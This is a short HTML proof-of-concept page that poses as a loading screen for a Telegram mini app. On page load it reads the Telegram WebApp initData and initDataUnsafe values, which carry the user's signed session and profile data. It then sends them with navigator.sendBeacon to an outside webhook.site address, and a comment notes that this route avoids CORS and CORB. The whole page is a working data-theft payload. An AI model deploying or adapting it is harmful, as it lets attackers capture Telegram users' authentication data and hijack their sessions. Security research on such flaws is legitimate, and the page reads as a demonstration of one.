<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: Telegram WebApp initData</title>
</head>
<body>
  <h1>Loading.....</h1>
  <p>app is opening</p>

  <!-- Load Telegram WebApp SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    window.addEventListener("DOMContentLoaded", () => {
      const initData = Telegram.WebApp.initData;
      const initDataUnsafe = Telegram.WebApp.initDataUnsafe;

      console.log("üîê Telegram initData:", initData);
      console.log("üîì Parsed initDataUnsafe:", initDataUnsafe);

      // Exfiltrate using sendBeacon (no CORS, no CORB)
      if (initData && initData.length > 0) {
        navigator.sendBeacon(
          "https://webhook.site/388648e4-9e1e-4912-b937-c8ac12c8aafd",
          new Blob([JSON.stringify({ initData, initDataUnsafe })], {
            type: "application/json"
          })
        );
      } else {
        console.warn("‚ö†Ô∏è initData is empty ‚Äî make sure you're inside Telegram WebView");
      }
    });
  </script>

</body>
</html>
